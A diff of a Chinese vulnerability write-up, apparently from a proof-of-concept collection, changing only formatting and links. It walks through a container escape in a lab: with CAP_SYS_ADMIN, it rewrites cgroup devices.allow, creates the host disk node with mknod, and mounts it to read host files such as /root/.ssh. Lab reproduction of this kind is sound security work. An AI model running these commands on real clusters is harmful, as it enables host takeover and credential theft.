@@ -2,7 +2,7 @@
 
 ## 漏洞描述
 
-在具有 `CAP_SYS_ADMIN` 权限的容器中，通过挂载并重写容器内的 `/sys/fs/cgroup/devices/devices.allow` 文件，解除 cgroup 设备访问限制，从而逃逸特权容器并访问宿主机内的文件。
+在具有 `CAP_SYS_ADMIN` 权限的容器中，通过挂载并重写容器内的 `/sys/fs/cgroup/devices/devices.allow` 文件，解除 cgroup 设备访问限制，从而逃逸特权容器并访问宿主机内的文件。
 
 devices 子系统用于配制允许或者阻止 cgroup 中的 task 访问某个设备，起到黑白名单的作用，主要包含以下文件：
 
@@ -22,12 +22,12 @@ devices 子系统用于配制允许或者阻止 cgroup 中的 task 访问某个�
 
 参考链接：
 
-- https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices
-- https://blog.nsfocus.net/docker/
+* https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices
+* https://blog.nsfocus.net/docker/
 
 ## 环境搭建
 
-基础环境准备（Docker + Minikube + Kubernetes），可参考 [Kubernetes + Ubuntu 18.04 漏洞环境搭建](https://github.com/Threekiii/Awesome-POC/blob/master/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md) 完成。
+基础环境准备（Docker + Minikube + Kubernetes），可参考 [Kubernetes + Ubuntu 18.04 漏洞环境搭建](<Kubernetes + Ubuntu 18.04 漏洞环境搭建.md>) 完成。
 
 本例中各组件版本如下：
 
@@ -54,7 +54,7 @@ NAME                      READY   STATUS    RESTARTS   AGE
 cap-sys-admin-container   1/1     Running   0          55s
 ```
 
-![](images/挂载重写%20cgroup%20devices.allow%20导致容器逃逸/image-20250603142938639.png)
+![](../.gitbook/assets/image-20250603142938639.png)
 
 ## 漏洞复现
 
@@ -64,13 +64,13 @@ cap-sys-admin-container   1/1     Running   0          55s
 kubectl exec -n metarget -it cap-sys-admin-container -- /bin/bash
 ```
 
-- 第一步，创建空目录挂载 cgroup devices 子系统：
+* 第一步，创建空目录挂载 cgroup devices 子系统：
 
 ```
 root@cap-sys-admin-container:/# mkdir /tmp/dev && mount -t cgroup -o devices devices /tmp/dev
 ```
 
-- 第二步，确定当前容器对应的子 cgroup 位置：
+* 第二步，确定当前容器对应的子 cgroup 位置：
 
 ```shell
 # 通过 docker info | grep -i cgroup 查看 Cgroup Driver
@@ -87,27 +87,27 @@ cgroup on /sys/fs/cgroup/systemd/kubepods.slice/kubepods-burstable.slice/xxx typ
 cd /tmp/dev/kubepods.slice/kubepods-burstable.slice/xxx
 ```
 
-- 第三步，设置其 devices.allow 文件为 `a`，表示所有设备均可访问：
+* 第三步，设置其 devices.allow 文件为 `a`，表示所有设备均可访问：
 
 ```
 root@cap-sys-admin-container:/tmp/dev/docker/f873f626e2cbc74eeae5c2b5c624f7fe1ed92e26b37a244d30d70403a1802ee8/kubepods/besteffort/podeda81e29-d18b-
 45e5-af93-1ba96c6f02e1/979a724c1ad544b8bbd8bbb8ec6ce2ca1f61ffe3ddd9088c8242d7238a7a647b# echo a > devices.allow && cd /tmp
 ```
 
-- 第四步，获得宿主机的设备 major 和 minor：
+* 第四步，获得宿主机的设备 major 和 minor：
 
 ```
 root@cap-sys-admin-container:/tmp# cat /proc/self/mountinfo | grep /etc | awk '{print $3,$8}' | head -1
 8:1 ext4
 ```
 
-- 第五步，通过 mknod 根据设备 major 和 minor 手动创建设备文件：
+* 第五步，通过 mknod 根据设备 major 和 minor 手动创建设备文件：
 
 ```
 root@cap-sys-admin-container:/tmp# mknod host b 8 1
 ```
 
-- 第六步，利用 debugfs 或直接挂载设备文件访问宿主机文件：
+* 第六步，利用 debugfs 或直接挂载设备文件访问宿主机文件：
 
 ```
 root@cap-sys-admin-container:/tmp# debugfs host
@@ -124,7 +124,7 @@ root@cap-sys-admin-container:/tmp# mkdir /tmp/host_dir && mount host /tmp/host_d
 root@cap-sys-admin-container:/tmp# ls -l /tmp/host_dir/root/.ssh
 ```
 
-![](images/挂载重写%20cgroup%20devices.allow%20导致容器逃逸/image-20250603152409473.png)
+![](../.gitbook/assets/image-20250603152409473.png)
 
 也可以通过 [CDK](https://github.com/cdk-team/CDK) 复现。下载 CDK ，将其传入容器 ：
 
@@ -133,11 +133,11 @@ kubectl cp cdk cap-sys-admin-container:/ -n metarget
 kubectl exec -n metarget -it cap-sys-admin-container -- chmod +x /cdk
 ```
 
-![](images/挂载重写%20cgroup%20devices.allow%20导致容器逃逸/image-20250603143413513.png)
+![](../.gitbook/assets/image-20250603143413513.png)
 
-重写当前容器内的 `/sys/fs/cgroup/devices/devices.allow`，逃逸特权容器访问宿主机内的文件：
+重写当前容器内的 `/sys/fs/cgroup/devices/devices.allow`，逃逸特权容器访问宿主机内的文件：
 
-![](images/挂载重写%20cgroup%20devices.allow%20导致容器逃逸/image-20250603143435283.png)
+![](../.gitbook/assets/image-20250603143435283.png)
 
 ## 环境复原
 
@@ -148,7 +148,7 @@ kubectl delete -f k8s_metarget_namespace.yaml
 
 ## YAML
 
-[cap_sys_admin-container.yaml](https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/cap_sys_admin-container.yaml)
+[cap\_sys\_admin-container.yaml](https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/cap_sys_admin-container.yaml)
 
 ```
 apiVersion: v1
